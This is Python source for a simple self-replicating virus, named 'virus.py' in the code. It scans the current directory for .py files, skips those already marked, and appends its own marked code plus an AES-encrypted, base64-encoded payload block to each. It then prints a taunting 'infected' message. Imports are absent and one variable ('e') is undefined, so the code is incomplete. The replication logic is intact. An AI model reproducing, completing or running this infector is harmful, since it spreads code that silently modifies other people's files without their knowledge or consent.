def is_infected(filename):
   f = open(filename, 'r')
   lines = f.readlines()
   if len(lines) < 58:
      return False
   print len(lines)
   print lines[len(lines) - 58]
   return lines[len(lines) - 58].startswith('######################################################## First script python')

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the original file
   for line in source:
      destination.write(line)

   destination.write("######################################################## First script python\n")
   destination.write("# coding=utf-8\n")
   destination.write("# Start Uncrypted\n")

   copy = False
   result = ''
   for line in this:
      if line.strip() == '# Start Uncrypted':
         copy = True
      elif line.strip() == '# End Uncrypted':
         destination.write('# End Uncrypted')
         copy = False
      elif copy:
         destination.write(line);

   destination.write("\n#Start payload\n")
   destination.write("#")
   destination.write(str(encrypt(e, filename)))
   destination.write("\n#End payload")

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()
 
def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)) and (filename != "virus.py"):
         print "Infected " +  str(filename)
         infect(filename)

def encrypt(data,filename):
   source = open(filename + '-copy', 'r')
   key = source.readline()

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   return base64.b64encode(encrypted)
 ####################

def payload():
   print "This file is infected infected! Mhuahauhauahau!"

find_and_infect_files()
payload()